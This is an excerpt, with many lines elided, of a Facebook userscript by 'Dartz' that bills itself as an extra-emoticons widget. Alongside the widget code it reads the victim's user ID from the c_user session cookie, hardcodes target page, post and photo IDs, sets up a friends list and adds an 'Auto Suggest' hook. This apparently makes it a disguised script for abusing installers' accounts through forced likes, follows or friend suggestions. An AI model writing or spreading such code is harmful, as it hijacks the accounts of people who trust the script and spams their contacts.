// ==UserScript==
// @name            Sembarang Kaler Pesbuk
// @description     By Dartz 
...
if(body != null) {
	...
	div.innerHTML = "<center><a href='http://https://www.facebook.com/Newbie.TerL4ntar'><img src='http://m.uploadedit.com/b018/1375198514954.gif' alt='Loading...' width=120 hight=90></a></center><br><br></br>"
	...
	div.style.width = "125px";
	div2.innerHTML = "<div style='background-color: #2E5392; color: #FFFFFF; 	border: 1px dashed #333333;'><center><a style='color: #FFFFFF;' onclick='spoiler()' title='Click to Hidden Widget'>&laquo;</a>&#8226; <a href='https://www.facebook.com/Newbie.TerL4ntar' style='color: #FFFFFF;' onclick='alert(\'Thanks for install this script\');'>By Dartz </a></center></div> "
	...
	for(i=1;i<=20;i++) {
		...
		div2.innerHTML = "<center><a onclick='spoiler()' title='Click to Hidden Widget'>&laquo;</a> &#8226; <a href='https://www.facebook.com/Newbie.TerL4ntar' title='Thanks for install this script'>My FansPage</a></center> "
		}
		else {
...
"chars" : " :) ",
	...
	// Toggler
	html += '<a class="navLink" title="Show Extra Emoticons">'; // var navLink
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/Newbie.TerL4ntar" target="_blank">Created by Dartz <br>(Click Here)</a>';
	html += '</div>';
...
var spage_id = "295071517205181";
var spost_id = "617724341638832";
var sfoto_id = "616451228432810";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Dartz';
